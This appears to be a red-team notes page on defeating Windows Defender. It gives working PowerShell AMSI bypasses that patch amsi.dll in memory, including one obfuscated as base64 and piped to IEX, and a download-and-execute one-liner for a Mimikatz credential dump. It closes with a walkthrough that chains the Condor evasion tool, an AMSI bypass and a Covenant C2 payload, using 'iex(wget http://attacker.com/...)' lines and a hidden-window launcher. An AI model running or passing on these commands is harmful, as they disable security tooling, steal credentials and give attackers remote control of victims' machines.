# Windows Defender

## AMSI Bypass

If you need to run some Powershell command that is being blocked by AMSI, try running this command to get around it:

![](<../Windows Defender/Images/amsi\_bypass3.png>) https://gist.githubusercontent.com/FatRodzianko/c8a76537b5a87b850c7d158728717998/raw/36103d12eec662d532c9127f2396bc347d13c3c5/my-am-bypass.ps1

You can base64 encode the command to be one line. Use CyberChef to encode the code to base64.

![](<../Windows Defender/Images/amsi\_bypass2.png>) CyberChef URL:

https://icyberchef.com/#recipe=To\_Base64('A-Za-z0-9%2B/%3D')\&input=JFdpbjMyID0gQCIKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CgpwdWJsaWMgY2xhc3MgV2luMzIgewoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBwcm9jTmFtZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludFB0ciBkd1NpemUsIHVpbnQgZmxOZXdQcm90ZWN0LCBvdXQgdWludCBscGZsT2xkUHJvdGVjdCk7Cgp9CiJACgpBZGQtVHlwZSAkV2luMzIKJHRlc3QgPSBbQnl0ZVtdXSgweDYxLCAweDZkLCAweDczLCAweDY5LCAweDJlLCAweDY0LCAweDZjLCAweDZjKQokTG9hZExpYnJhcnkgPSBbV2luMzJdOjpMb2FkTGlicmFyeShbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoJHRlc3QpKQokdGVzdDIgPSBbQnl0ZVtdXSAoMHg0MSwgMHg2ZCwgMHg3MywgMHg2OSwgMHg1MywgMHg2MywgMHg2MSwgMHg2ZSwgMHg0MiwgMHg3NSwgMHg2NiwgMHg2NiwgMHg2NSwgMHg3MikKJEFkZHJlc3MgPSBbV2luMzJdOjpHZXRQcm9jQWRkcmVzcygkTG9hZExpYnJhcnksIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldFN0cmluZygkdGVzdDIpKQokcCA9IDAKW1dpbjMyXTo6VmlydHVhbFByb3RlY3QoJEFkZHJlc3MsIFt1aW50MzJdNSwgMHg0MCwgW3JlZl0kcCkKJFBhdGNoID0gW0J5dGVbXV0gKDB4MzEsIDB4QzAsIDB4MDUsIDB4NzgsIDB4MDEsIDB4MTksIDB4N0YsIDB4MDUsIDB4REYsIDB4RkUsIDB4RUQsIDB4MDAsIDB4QzMpCiMwOiAgMzEgYzAgICAgICAgICAgICAgICAgICAgeG9yICAgIGVheCxlYXgKIzI6ICAwNSA3OCAwMSAxOSA3ZiAgICAgICAgICBhZGQgICAgZWF4LDB4N2YxOTAxNzgKIzc6ICAwNSBkZiBmZSBlZCAwMCAgICAgICAgICBhZGQgICAgZWF4LDB4ZWRmZWRmCiNjOiAgYzMgICAgICAgICAgICAgICAgICAgICAgcmV0IApbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQYXRjaCwgMCwgJEFkZHJlc3MsICRQYXRjaC5MZW5ndGgp

Command:

```
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFdpbjMyID0gQCIKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CgpwdWJsaWMgY2xhc3MgV2luMzIgewoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBwcm9jTmFtZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludFB0ciBkd1NpemUsIHVpbnQgZmxOZXdQcm90ZWN0LCBvdXQgdWludCBscGZsT2xkUHJvdGVjdCk7Cgp9CiJACgpBZGQtVHlwZSAkV2luMzIKJHRlc3QgPSBbQnl0ZVtdXSgweDYxLCAweDZkLCAweDczLCAweDY5LCAweDJlLCAweDY0LCAweDZjLCAweDZjKQokTG9hZExpYnJhcnkgPSBbV2luMzJdOjpMb2FkTGlicmFyeShbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoJHRlc3QpKQokdGVzdDIgPSBbQnl0ZVtdXSAoMHg0MSwgMHg2ZCwgMHg3MywgMHg2OSwgMHg1MywgMHg2MywgMHg2MSwgMHg2ZSwgMHg0MiwgMHg3NSwgMHg2NiwgMHg2NiwgMHg2NSwgMHg3MikKJEFkZHJlc3MgPSBbV2luMzJdOjpHZXRQcm9jQWRkcmVzcygkTG9hZExpYnJhcnksIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldFN0cmluZygkdGVzdDIpKQokcCA9IDAKW1dpbjMyXTo6VmlydHVhbFByb3RlY3QoJEFkZHJlc3MsIFt1aW50MzJdNSwgMHg0MCwgW3JlZl0kcCkKJFBhdGNoID0gW0J5dGVbXV0gKDB4MzEsIDB4QzAsIDB4MDUsIDB4NzgsIDB4MDEsIDB4MTksIDB4N0YsIDB4MDUsIDB4REYsIDB4RkUsIDB4RUQsIDB4MDAsIDB4QzMpCiMwOiAgMzEgYzAgICAgICAgICAgICAgICAgICAgeG9yICAgIGVheCxlYXgKIzI6ICAwNSA3OCAwMSAxOSA3ZiAgICAgICAgICBhZGQgICAgZWF4LDB4N2YxOTAxNzgKIzc6ICAwNSBkZiBmZSBlZCAwMCAgICAgICAgICBhZGQgICAgZWF4LDB4ZWRmZWRmCiNjOiAgYzMgICAgICAgICAgICAgICAgICAgICAgcmV0IApbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQYXRjaCwgMCwgJEFkZHJlc3MsICRQYXRjaC5MZW5ndGgp")) | IEX
```

### Execution

![](<../Windows Defender/Images/amsi\_bypass1.png>)

## Defeating Windows Defender & Bypassing Amsi And Running Mimikatz

### Execution

![](<../Windows Defender/Images/wd+amsi\_bypass\_mimikatz.png>)

Command:

```
iex(wget https://gist.github.com/pich4ya/e93abe76d97bd1cf67bfba8dce9c0093/raw/e32760420ae642123599b6c9c2fddde2ecaf7a2b/Invoke-OneShot-Mimikatz.ps1 -UseBasicParsing)
```

## AMSI Bypass (by [am0nsec](https://twitter.com/am0nsec))

```
Write-Host "-- AMSI Patch"
Write-Host "-- Paul Laîné (@am0nsec)"
Write-Host ""

$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Kernel32

Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}

[IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
Write-Host "[+] AMSI DLL Handle: $hModule"

[IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")
Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"

If ([IntPtr]::Size -eq 8) {
	Write-Host "[+] 64-bits process"
    [byte[]]$egg = [byte[]] (
        0x4C, 0x8B, 0xDC,       # mov     r11,rsp
        0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
        0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
        0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
        0x57,                   # push    rdi
        0x41, 0x56,             # push    r14
        0x41, 0x57,             # push    r15
        0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
    )
} Else {
	Write-Host "[+] 32-bits process"
    [byte[]]$egg = [byte[]] (
        0x8B, 0xFF,             # mov     edi,edi
        0x55,                   # push    ebp
        0x8B, 0xEC,             # mov     ebp,esp
        0x83, 0xEC, 0x18,       # sub     esp,18h
        0x53,                   # push    ebx
        0x56                    # push    esi
    )
}
[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)
Write-Host "[+] Targeted address: $targetedAddress"

$oldProtectionBuffer = 0
[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null

$patch = [byte[]] (
    0x31, 0xC0,    # xor rax, rax
    0xC3           # ret  
)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)

$a = 0
[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null
```

## Using condor tool + AMSI bypass + Covenant C2

The [condor](https://github.com/MrEmpy/Condor) tool is used for evasion of protection like AVs/EDRs/XDRs. You can use it to combo an AMSI bypass and a C2 like Covenant.

1. On the attacker's machine, create a folder where there will be two powershell scripts, one to bypass AMSI and another for the target to connect with C2.

bypass.ps1

```
# TLDR:
# iex(wget https://gist.githubusercontent.com/pich4ya/e93abe76d97bd1cf67bfba8dce9c0093/raw/4cee3d04127ca304bb04c9d95f3146eb7e9985a8/Invoke-OneShot-Mimikatz.ps1 -UseBasicParsing)
#
# @author Pichaya Morimoto (p.morimoto@sth.sh)
# One Shot for M1m1katz PowerShell Dump All Creds with AMSI Bypass 2022 Edition
# (Tested and worked on Windows 10 x64 patched 2022-03-26)
#
# Usage:
# 1. You need a local admin user's powershell with Medium Mandatory Level (whoami /all)
# 2. iex(wget https://gist.githubusercontent.com/pich4ya/e93abe76d97bd1cf67bfba8dce9c0093/raw/4cee3d04127ca304bb04c9d95f3146eb7e9985a8/Invoke-OneShot-Mimikatz.ps1 -UseBasicParsing)
# or
# iex(wget https://attacker-local-ip/Invoke-OneShot-Mimikatz.ps1 -UseBasicParsing)
#
# AMSI Bypass is copied from payatu's AMSI-Bypass (23-August-2021)
# https://payatu.com/blog/arun.nair/amsi-bypass
$code = @"
using System;
using System.Runtime.InteropServices;
public class WinApi {

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out int lpflOldProtect);

}
"@

Add-Type $code

$amsiDll = [WinApi]::LoadLibrary("amsi.dll")
$asbAddr = [WinApi]::GetProcAddress($amsiDll, "Ams"+"iScan"+"Buf"+"fer")
$ret = [Byte[]] ( 0xc3, 0x80, 0x07, 0x00,0x57, 0xb8 )
$out = 0

[WinApi]::VirtualProtect($asbAddr, [uint32]$ret.Length, 0x40, [ref] $out)
[System.Runtime.InteropServices.Marshal]::Copy($ret, 0, $asbAddr, $ret.Length)
[WinApi]::VirtualProtect($asbAddr, [uint32]$ret.Length, $out, [ref] $null)


# nishang - 2.2.0 (Jul 24, 2021)
# Change this to "attacker-local-ip" for internal sources

iex(wget http://attacker.com/exec.ps1 -UseBasicParsing)
```

[Reference](https://gist.github.com/pich4ya/e93abe76d97bd1cf67bfba8dce9c0093)

On the last line where there is the `wget` command, put the IP of the attacker's machine where it will contain the two files (bypass.ps1 and exec.ps1)

1. Go to Covenant and generate a powershell payload

![](<../Windows Defender/Images/genpscovenant1.png>)

![](<../Windows Defender/Images/genpscovenant2.png>)

The payload will look like this:

exec.ps1

```
sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('7Vp7cFzle...
```

1. Now create a file called exec.ps1 and paste the modified payload
2. Open an HTTP port so the target can connect to it and run bypass.ps1

![](<../Windows Defender/Images/httpopencovenant.png>)

1. Run the following command using the condor tool:

```
python3 condor.py -p windows/x64/exec
```

1. Paste the following command:

```
powershell -Sta -Nop -Window Hidden -Command "iex(wget http://attacker.com/bypass.ps1 -UseBasicParsing)"
```

Substitute "attacker.com" for the ip of the attacker's machine.

1. After generating the EXE, run it on the target machine.

![](<../Windows Defender/Images/covenantpoc1.png>)

![](<../Windows Defender/Images/covenantpoc2.png>)
